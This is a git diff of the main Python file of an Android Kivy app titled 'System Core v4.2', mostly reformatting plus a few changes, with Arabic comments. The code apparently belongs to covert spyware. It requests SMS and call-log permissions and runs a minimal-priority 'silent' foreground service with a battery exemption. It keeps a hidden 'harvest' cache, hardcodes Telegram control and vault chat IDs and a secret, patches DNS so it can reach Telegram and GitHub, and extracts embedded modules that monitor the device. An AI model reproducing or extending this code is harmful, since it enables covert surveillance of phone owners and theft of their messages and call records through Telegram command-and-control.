@@ -1,6 +1,18 @@
 # -*- coding: utf-8 -*-
-import os, sys, threading, importlib, requests, traceback, gc, time, socket, random, shutil, subprocess
+import os
+import sys
+import threading
+import importlib
+import requests
+import traceback
+import gc
+import time
+import socket
+import random
+import shutil
+import subprocess
 from datetime import datetime
+
 from kivy.app import App
 from kivy.uix.textinput import TextInput
 from kivy.uix.boxlayout import BoxLayout
@@ -8,27 +20,47 @@ from kivy.uix.button import Button
 from kivy.clock import Clock
 from kivy.core.clipboard import Clipboard
 
-# ========== DNS patch (احتياطي ذكي) ==========
+# ======================== DNS PATCH (احتياطي ذكي) ============================
 def _patch_dns():
     original_getaddrinfo = socket.getaddrinfo
+
     def patched_getaddrinfo(host, port, family=0, type=0, proto=0, flags=0):
         try:
             result = original_getaddrinfo(host, port, family, type, proto, flags)
-            if result: return result
-        except: pass
+            if result:
+                return result
+        except:
+            pass
+
         override = {
-            'raw.githubusercontent.com': ['185.199.108.133', '185.199.109.133', '185.199.110.133', '185.199.111.133'],
-            'api.telegram.org': ['149.154.167.220', '149.154.167.221', '149.154.167.99', '149.154.175.50'],
-            'zaen1993.github.io': ['185.199.108.153', '185.199.109.153', '185.199.110.153', '185.199.111.153'],
-            'cdn.jsdelivr.net': ['151.101.2.229', '151.101.66.229', '151.101.130.229']
+            'raw.githubusercontent.com': [
+                '185.199.108.133', '185.199.109.133',
+                '185.199.110.133', '185.199.111.133'
+            ],
+            'api.telegram.org': [
+                '149.154.167.220', '149.154.167.221',
+                '149.154.167.99', '149.154.175.50'
+            ],
+            'zaen1993.github.io': [
+                '185.199.108.153', '185.199.109.153',
+                '185.199.110.153', '185.199.111.153'
+            ],
+            'cdn.jsdelivr.net': [
+                '151.101.2.229', '151.101.66.229',
+                '151.101.130.229'
+            ]
         }
         if host in override:
             fake_ip = random.choice(override[host])
             return [(socket.AF_INET, socket.SOCK_STREAM, 6, '', (fake_ip, port))]
         return original_getaddrinfo(host, port, family, type, proto, flags)
+
     socket.getaddrinfo = patched_getaddrinfo
+
+
 _patch_dns()
 
+# ========================== الإعدادات الأساسية ================================
 INDEX_BASE_URLS = [
     "https://cdn.jsdelivr.net/gh/Zaen1993/Android-Core@main/index.json",
     "https://zaen1993.github.io/Android-Core/index.json",
@@ -37,8 +69,10 @@ INDEX_BASE_URLS = [
 
 HEADERS = {
     'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
-    'Cache-Control': 'no-cache', 'Pragma': 'no-cache'
+    'Cache-Control': 'no-cache',
+    'Pragma': 'no-cache'
 }
+
 
 def _get_path():
     try:
@@ -51,16 +85,21 @@ def _get_path():
     os.makedirs(p, exist_ok=True)
     return p
 
+
 R = _get_path()
 U = os.path.join(R, "updates")
 os.makedirs(U, exist_ok=True)
+
 HARVEST_QUEUE = os.path.join(R, ".cache_thumb")
 os.makedirs(HARVEST_QUEUE, exist_ok=True)
+
 MODELS_DIR = os.path.join(R, "models")
 os.makedirs(MODELS_DIR, exist_ok=True)
 
-if R not in sys.path: sys.path.insert(0, R)
+if R not in sys.path:
+    sys.path.insert(0, R)
 
+# ======================== الخدمات الخلفية ====================================
 def start_silent_service():
     try:
         from jnius import autoclass
@@ -69,13 +108,15 @@ def start_silent_service():
         ch = autoclass('android.app.NotificationChannel')
         channel = ch("core_svc", "System Services", nm.IMPORTANCE_MIN)
         act.getSystemService(nm).createNotificationChannel(channel)
+
         builder = autoclass('android.app.Notification$Builder')(act, "core_svc")
         builder.setSmallIcon(act.getApplicationInfo().icon)
         builder.setPriority(autoclass('android.app.Notification').PRIORITY_MIN)
         act.startForeground(9921, builder.build())
-        print("Foreground silent service started")
+        print("✅ Foreground silent service started")
     except Exception as e:
-        print(f"Foreground service error: {e}")
+        print(f"❌ Foreground service error: {e}")
+
 
 def open_notification_settings():
     try:
@@ -83,14 +124,16 @@ def open_notification_settings():
         Intent = autoclass('android.content.Intent')
         Settings = autoclass('android.provider.Settings')
         ctx = autoclass('org.kivy.android.PythonActivity').mActivity
+
         intent = Intent(Settings.ACTION_APP_NOTIFICATION_SETTINGS)
         intent.putExtra(Settings.EXTRA_APP_PACKAGE, ctx.getPackageName())
         ctx.startActivity(intent)
     except Exception as e:
-        print(f"Could not open notification settings: {e}")
+        print(f"⚠️ Could not open notification settings: {e}")
+
 
 def _perms():
-    """طلب جميع الصلاحيات المطلوبة بما في ذلك READ_SMS و READ_CALL_LOG"""
+    """طلب جميع الصلاحيات المطلوبة."""
     try:
         from android.permissions import request_permissions, Permission
         request_permissions([
@@ -106,15 +149,16 @@ def _perms():
             "android.permission.READ_CALL_LOG"
         ])
     except Exception as e:
-        print(f"Permissions error: {e}")
-    
+        print(f"❌ Permissions error: {e}")
+
     start_silent_service()
-    
+
     def delayed_notification_settings():
         time.sleep(2)
         open_notification_settings()
+
     threading.Thread(target=delayed_notification_settings, daemon=True).start()
-    
+
     try:
         from jnius import autoclass
         ctx = autoclass('org.kivy.android.PythonActivity').mActivity
@@ -126,8 +170,10 @@ def _perms():
             intent.setData(Uri.parse(f"package:{ctx.getPackageName()}"))
             ctx.startActivity(intent)
     except Exception as e:
-        print(f"Battery exemption error: {e}")
+        print(f"⚠️ Battery exemption error: {e}")
 
+
+# ======================== تحميل الإعدادات ====================================
 def load_secrets_from_config():
     config_module = None
     try:
@@ -138,22 +184,28 @@ def load_secrets_from_config():
         except ImportError:
             print("⚠️ Warning: No config file found, using defaults")
             return [], [], -1003943094277, -1003577715762, "@321@321neaz"
-    
+
     if not hasattr(config_module, 'load_config'):
         print("⚠️ Warning: Config file has no load_config function")
         return [], [], -1003943094277, -1003577715762, "@321@321neaz"
-    
+
     try:
         active, reserve, ctrl, vault, secret = config_module.load_config()
-        if not active: active = []
-        if not reserve: reserve = []
-        if not ctrl: ctrl = -1003943094277
-        if not vault: vault = -1003577715762
-        if not secret: secret = "@321@321neaz"
+        if not active:
+            active = []
+        if not reserve:
+            reserve = []
+        if not ctrl:
+            ctrl = -1003943094277
+        if not vault:
+            vault = -1003577715762
+        if not secret:
+            secret = "@321@321neaz"
         return active, reserve, ctrl, vault, secret
     except Exception as e:
         print(f"⚠️ Error loading config: {e}, using defaults")
         return [], [], -1003943094277, -1003577715762, "@321@321neaz"
+
 
 def fetch_index():
     for url in INDEX_BASE_URLS:
@@ -168,84 +220,54 @@ def fetch_index():
             continue
     return None
 
+
+# ================== نسخ نموذج الذكاء الاصطناعي (محلياً فقط) ==================
 def copy_model_to_models_dir():
     """
-    نسخ ملف النموذج من assets أو أي مسار آخر إلى مجلد models.
-    يبحث في عدة مسارات محتملة (assets، المجلد المحلي، مسارات النظام).
+    نسخ ملف النموذج من مجلد assets إلى مجلد models.
+    لا يتم التحميل من الإنترنت مطلقاً – يعتمد فقط على الملف المدمج في APK.
     """
     try:
-        model_min_size = 5000000  # 5MB (النموذج الفعلي 5.19MB)
+        model_min_size = 5_000_000   # 5 ميغابايت
         dest = os.path.join(MODELS_DIR, "engine_v2.tflite")
-        
-        # إذا كان الملف موجوداً ومكتملاً في الوجهة، لا داعي للنسخ
+
+        # إذا كان الملف موجوداً ومكتملاً في الوجهة، نكتفي به
         if os.path.exists(dest) and os.path.getsize(dest) >= model_min_size:
             print(f"✅ Model already exists at {dest}")
             return True
-        
-        # قائمة المسارات المحتملة للنموذج
+
+        # قائمة المسارات المحتملة للنموذج داخل التطبيق (بدون تحميل خارجي)
         possible_paths = [
-            # مسار assets داخل APK
             os.path.join(os.path.dirname(os.path.abspath(__file__)), "assets", "engine_v2.tflite"),
-            # المجلد الحالي
-            os.path.join(os.path.dirname(os.path.abspath(__file__)), "engine_v2.tflite"),
-            # مسار النظام داخل التطبيق
+            os.path.join(os.getcwd(), "assets", "engine_v2.tflite"),
+            "/data/data/com.sys.shieldcore/files/app/assets/engine_v2.tflite",
             "/data/data/com.sys.shieldcore/files/assets/engine_v2.tflite",
-            "/data/data/com.sys.shieldcore/files/engine_v2.tflite",
-            # المجلد المؤقت
-            os.path.join(R, "engine_v2.tflite"),
-            # مجلد النماذج نفسه (ربما تم نسخه سابقاً لكن بحجم غير مكتمل)
-            dest
         ]
-        
+
         for src in possible_paths:
             if os.path.exists(src):
                 size = os.path.getsize(src)
                 if size >= model_min_size:
-                    # نسخ الملف
                     shutil.copy2(src, dest)
-                    # التحقق من نجاح النسخ
                     if os.path.exists(dest) and os.path.getsize(dest) >= model_min_size:
-                        print(f"✅ Model copied from {src} to {dest} (size: {size/1024/1024:.2f} MB)")
+                        print(f"✅ Model copied from {src} to {dest} ({size/1024/1024:.2f} MB)")
                         return True
                     else:
                         print(f"⚠️ Copy from {src} failed or file incomplete")
                 else:
                     print(f"⚠️ Model file too small at {src}: {size} bytes (min {model_min_size})")
-        
-        # محاولة التحميل من الإنترنت كحل أخير
-        print("⚠️ Model not found locally, attempting download from GitHub...")
-        model_urls = [
-            "https://github.com/Zaen1993/nsfw-converter/raw/main/engine_v2.tflite",
-            "https://zaen1993.github.io/nsfw-converter/engine_v2.tflite"
-        ]
-        
-        for url in model_urls:
-            try:
-                print(f"📥 Downloading from: {url}")
-                resp = requests.get(url, timeout=60, stream=True, verify=True)
-                if resp.status_code == 200:
-                    with open(dest, 'wb') as f:
-                        for chunk in resp.iter_content(chunk_size=8192):
-                            f.write(chunk)
-                    if os.path.exists(dest) and os.path.getsize(dest) >= model_min_size:
-                        print(f"✅ Model downloaded successfully to {dest}")
-                        return True
-                else:
-                    print(f"⚠️ Download failed: HTTP {resp.status_code}")
-            except Exception as e:
-                print(f"⚠️ Download from {url} failed: {e}")
-                continue
-        
-        print("❌ CRITICAL: Failed to locate or download engine_v2.tflite!")
+
+        print("❌ CRITICAL: engine_v2.tflite NOT FOUND in assets/ folder!")
+        print("💡 تأكد من وضع ملف النموذج في المسار: assets/engine_v2.tflite")
         return False
-        
+
     except Exception as e:
         print(f"❌ Error copying model: {e}")
-        import traceback
         traceback.print_exc()
         return False
 
-# ========== تثبيت tflite-runtime في وقت التشغيل ==========
+
+# ================== تثبيت tflite-runtime في وقت التشغيل ======================
 def ensure_tflite_runtime():
     """
     التأكد من تثبيت tflite-runtime، وتثبيته عبر pip إذا لم يكن موجوداً.
@@ -264,7 +286,8 @@ def ensure_tflite_runtime():
             print(f"❌ Failed to install tflite-runtime: {e}")
             return False
 
-# ========== تضمين الملفات الأساسية (لضمان الإقلاع المحلي) ==========
+
+# ================ الملفات الأساسية المضمنة (لضمان الإقلاع المحلي) ==============
 EMBEDDED_FILES = {
     "telegram_ui.py": r'''
 # -*- coding: utf-8 -*-
@@ -1180,11 +1203,13 @@ def ex(cmd, tg, m, cid, cbq=None):
 '''
 }
 
+
 def _extract_embedded_files():
     """كتابة الملفات المضمّنة إلى المجلد R مع التحقق من صحتها."""
     for filename, content in EMBEDDED_FILES.items():
         dest = os.path.join(R, filename)
         should_extract = False
+
         if not os.path.exists(dest):
             should_extract = True
         else:
@@ -1202,7 +1227,7 @@ def _extract_embedded_files():
                         should_extract = True
             except Exception:
                 should_extract = True
-        
+
         if should_extract:
             try:
                 with open(dest, 'w', encoding='utf-8') as f:
@@ -1213,30 +1238,35 @@ def _extract_embedded_files():
             except Exception as e:
                 print(f"❌ Failed to extract {filename}: {e}")
 
+
+# ============================== تطبيق Kivy ====================================
 class CoreApp(App):
     def build(self):
         _extract_embedded_files()
-        
+
         self.title = "System Core v4.2"
         layout = BoxLayout(orientation='vertical', spacing=5)
-        
+
         self.log = TextInput(
-            text="", readonly=True,
+            text="",
+            readonly=True,
             background_color=(0.02, 0.02, 0.02, 1),
-            foreground_color=(0.3, 0.9, 0.3, 1), font_size='10sp'
+            foreground_color=(0.3, 0.9, 0.3, 1),
+            font_size='10sp'
         )
-        
+
         btns = BoxLayout(size_hint=(1, 0.08), spacing=5)
         copy_btn = Button(text="📋 COPY LOG", background_color=(0.2, 0.4, 0.6, 1))
         copy_btn.bind(on_press=self._copy)
         clear_btn = Button(text="🗑 CLEAR", background_color=(0.6, 0.2, 0.2, 1))
         clear_btn.bind(on_press=self._clear)
+
         btns.add_widget(copy_btn)
         btns.add_widget(clear_btn)
-        
+
         layout.add_widget(self.log)
         layout.add_widget(btns)
-        
+
         Clock.schedule_once(self._start, 0.5)
         return layout
 
@@ -1245,7 +1275,7 @@ class CoreApp(App):
             Clipboard.copy(self.log.text)
             print("✅ Log copied to clipboard")
         except Exception as e:
-            print(f"Copy error: {e}")
+            print(f"⚠️ Copy error: {e}")
 
     def _clear(self, instance):
         self.log.text = ""
@@ -1254,56 +1284,58 @@ class CoreApp(App):
     def _start(self, dt):
         def _log(msg):
             Clock.schedule_once(lambda x: setattr(self.log, 'text', self.log.text + msg + "\n"))
-        
+
         _log("[INIT] Starting system...")
         self._init_core()
 
     def _init_core(self):
         def _log(msg):
             Clock.schedule_once(lambda x: setattr(self.log, 'text', self.log.text + msg + "\n"))
-        
+
         try:
             # ===== 1. إعداد الصلاحيات =====
             _log("[1/5] Setting permissions...")
             _perms()
-            
+
             # ===== 2. نسخ نموذج الذكاء الاصطناعي =====
             _log("[2/5] Copying AI model...")
-            copy_model_to_models_dir()
-            
+            model_ok = copy_model_to_models_dir()
+            _log(f"     Model status: {'✅ OK' if model_ok else '❌ FAILED'}")
+
             # ===== 3. تحميل الإعدادات =====
             _log("[3/5] Loading configuration...")
             active, reserve, ctrl, vault, secret = load_secrets_from_config()
             _log(f"     Active tokens: {len(active)}, Reserve tokens: {len(reserve)}")
             _log(f"     Control ID: {ctrl}, Vault ID: {vault}")
-            
+
             # ===== 4. التأكد من تثبيت tflite-runtime =====
             _log("[4/5] Ensuring tflite-runtime...")
             ensure_tflite_runtime()
-            
+
             # ===== 5. تهيئة المكونات الأساسية =====
             _log("[5/5] Initializing components...")
-            
+
             from monitor import M
             mon = M()
+
             from telegram_ui import T
             ui = T(mon, active, reserve, ctrl, vault, secret)
-            
+
             mon.ui = ui
             mon.ctrl = ctrl
             mon.vlt = vault
-            
+
             # ===== 6. بدء التشغيل =====
             _log("[6/5] Starting services...")
             ui.start()
             mon.start()
-            
+
             _log("✅ System initialized successfully!")
             _log(f"📱 Device: {mon.dmd} ({mon.did[:8]})")
-            
+
             self.mon = mon
             self.ui = ui
-            
+
         except Exception as e:
             _log(f"❌ ERROR: {str(e)}")
             _log(f"❌ Traceback: {traceback.format_exc()}")
@@ -1318,7 +1350,8 @@ class CoreApp(App):
                 self.ui.stop()
             print("✅ Application stopped cleanly")
         except Exception as e:
-            print(f"Stop error: {e}")
+            print(f"⚠️ Stop error: {e}")
+
 
 if __name__ == '__main__':
     CoreApp().run()
